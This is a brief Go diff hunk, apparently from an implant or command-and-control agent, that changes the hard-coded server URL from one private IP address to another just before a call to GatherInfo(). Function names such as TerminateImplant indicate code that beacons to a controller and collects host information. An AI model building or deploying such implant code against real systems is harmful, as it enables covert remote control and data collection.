@@ -225,7 +225,7 @@ func TerminateImplant() {
 func main() {
 
 	retryCounter := 0
-	serverUrl := "https://192.168.15.172:8000"
+	serverUrl := "https://192.168.15.25:8000"
 
 	initialInfo := GatherInfo()
 
